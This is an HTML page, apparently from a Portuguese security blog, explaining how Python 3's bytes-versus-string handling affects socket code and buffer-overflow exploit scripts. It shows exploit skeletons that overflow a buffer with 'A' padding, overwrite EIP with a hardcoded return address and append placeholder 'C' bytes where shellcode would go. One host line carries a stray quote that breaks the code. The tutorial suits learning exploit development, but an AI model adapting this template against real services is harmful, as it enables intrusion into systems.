@@ -1,0 +1,85 @@
+<!doctype html>
+<html lang="pt-BR">
+<head>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <title>BoF + Sockets + Erros de Codificação com o Python3 - OffensiveThink</title>
+  <link rel="stylesheet" href="../assets/zine.css">
+</head>
+<body class="article">
+<main class="page article-page">
+<pre>
+     BOF + SOCKETS + ERROS DE CODIFICAÇÃO COM O PYTHON3
+
+
+        ----------------------------------------------------------------
+        offensive think :: artigo técnico em formato zine / nfo
+        ----------------------------------------------------------------
+
+        titulo : BoF + Sockets + Erros de Codificação com o Python3
+        autor  : offensive think
+        data   : Wed, Oct 28, 2020
+        tags   : bof
+
+        ----------------------------------------------------------------
+        --&gt; https://www.offensivethink.com/posts/bof-socket-python3.html &lt;--
+
+Com a vinda do Python 3 a forma com que as strings são &quot;tratadas&quot; mudou. O que antes, no Python 2 era um conjunto de caracteres ASCII , agora são Unicode. E o que isso muda para quem tá escrevendo exploits para explorar Buffer Overflow e até mesmo para quem deseja simplesmente enviar algo por um socket ?
+Quando &quot;chamamos&quot; a função send() de um socket, esta espera como parâmetro Bytes. Se você tenta simplesmente enviar uma string como ocorria no Python2, um erro surge, informando: _TypeError: a bytes-like object is required, not &#x27;str&#x27; with send function_
+Para contornar, você precisará codificar a string que você quer enviar na codificação que deseja, ou simplesmente, informar que trata-se de uma sequência de bytes, colocando um b antes dela:
+
+    import sys,socket
+    
+    host=&quot;127.0.0.1&quot;&quot;
+    port=12345
+    
+    # 1a forma - atenção para o b , antes das aspas.
+    buffer=b&quot;alo mundo&quot;
+    # 2a forma - informando que é uma sequencia de bytes utf-8
+    buffer=&quot;alo_mundo&quot;.encode(&#x27;utf-8&#x27;) 
+    
+    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+    s.connect((host,port))
+    s.send(buffer)  # &lt;------------- Função afetada, em questão!
+    s.close()
+
+E para quem está escrevendo exploits ? Iremos notar que as o envio de UTF-8 não vai nos ajudar a encaixar o endereço certinho no EIP ou mesmo bagunçar o nosso Shell Code ? Porque ? Pois endereços , opcodes, etc., estão todos dentro do escopo apenas da antiga e atual tabela ASCII estendida, 0 - 255 bytes.
+Uma forma, usando apenas strings com código hexa diretamente inserido.
+
+    
+    buffer=&quot;CMD &quot; + &quot;A&quot; * 143
+    EIP=&quot;\x6F\x14\x74\x72&quot; #&lt;-------- Endereço já em Little Endian
+    shellcode=&quot;C&quot; * (700-len(buffer)-len(EIP))
+    
+    buffer=buffer+EIP+shellcode
+    
+    s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
+    s.connect((host,port))
+    print(s.recv(4096))
+    s.sendall(buffer.encode(&#x27;latin-1&#x27;)) #&lt;----- encoding in Latin-1
+    print(&quot;[+] Sending Exploit %s&quot; % buffer )
+    s.close()
+
+Se usarmos a função pack() do módulo struct, que tem a função de convertes o endereço em Little Endian, é necesário que transformemos todas as strings em bytes, pois esta funçao retorna bytes.
+
+    buffer= (&quot;EXPLOIT1 &quot; + &quot;A&quot; * 143).encode(&#x27;latin-1&#x27;) #&lt;--- encoding
+    EIP=pack(&quot;&lt;L&quot;,0x7274146F)
+    shellcode=(&quot;C&quot; * (700-len(buffer)-len(EIP))).encode(&#x27;latin-1&#x27;) #&lt;--- encoding
+    
+    buffer=buffer + EIP + shellcode
+    
+    s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
+    s.connect((host,port))
+    print(s.recv(4096))
+    s.sendall(buffer)
+    print(&quot;[+] Sending Exploit %s&quot; % buffer )
+    s.close()
+
+
+---[ EOF ]--------------------------------------------------------------
+
+                    offensive think / 2026
+</pre>
+</main>
+</body>
+</html>
